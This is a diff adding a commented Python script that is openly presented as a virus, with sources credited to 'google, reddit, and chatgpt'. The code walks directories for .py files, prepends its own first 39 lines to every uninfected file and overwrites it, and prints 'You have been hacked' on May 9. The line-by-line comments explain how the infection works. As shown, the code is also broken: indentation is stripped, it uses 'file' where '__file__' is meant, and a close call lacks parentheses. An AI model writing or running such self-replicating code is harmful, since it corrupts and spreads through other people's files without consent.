@@ -1,0 +1,61 @@
+ #The following line specifies that this script should be run using Python 3
+#!/usr/bin/python3
+ #This line imports the 'os' and 'datetime' modules from the Python Standard Library
+import os
+import datetime
+ #This line defines a string variable named 'SIGNATURE' and sets its value to "VIRUS"
+SIGNATURE = "VIRUS"
+ #This function takes a path as an input and returns a list of all files with the extension '.py'
+ that are not already infected with the 'SIGNATURE' virus.
+ It repeatedly searches through directories for files that end with '.py' and checks if they are infected by
+ looking for the 'SIGNATURE' string in the file.
+ #If the file is not infected, it is added to a list of files to be infected.
+def locate(path):
+files_targeted = []
+filelist = os.listdir(path)
+for fname in filelist:
+if os.path.isdir(path+"/"+fname):
+files_targeted.extend(locate(path+"/"+fname))
+elif fname[-3:] == ".py":
+infected = False
+for line in open(path+"/"+fname):
+if SIGNATURE in line:
+infected = True
+break
+if infected == False:
+files_targeted.append(path+"/"+fname)
+return files_targeted
+ #This function takes a list of files to be infected as input and adds a string containing the virus code to the
+ beginning of each file.
+ It reads the virus code from the current script and concatenates it with the existing content of each file.
+ #Finally, it overwrites each file with the new, infected content.
+def infect(files_targeted):
+virus = open(os.path.abspath(file))
+virusstring = ""
+for i,line in enumerate(virus):
+if 0 <= i < 39:
+virusstring += line
+virus.close
+for fname in files_targeted:
+f = open(fname)
+temp = f.read()
+f.close()
+f = open(fname,"w")
+f.write(virusstring + temp)
+f.close()
+ #This function checks the current date and if it is May 9th, it prints a message indicating that the user has been hacked.
+def detonate():
+if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
+print("You have been hacked")
+ #This line calls the 'locate' function with the current working directory as input and assigns the resulting list of
+ files to 'files_targeted'
+files_targeted = locate(os.path.abspath(""))
+ #This line calls the 'infect' function with the list of files to be infected as input
+infect(files_targeted)
+ #This line calls the 'detonate' function to check if the current date is May 9th and print a message if it is.
+detonate()
+ #Overall, this script is a virus that searches for Python files in the current directory and its subdirectories,
+ infects them with a string of code at the beginning of each file, and checks if today's date is May 9th, in which
+ case it prints a message indicating that the user has been hacked.
+
+sources; google,reddit, and chatgpt
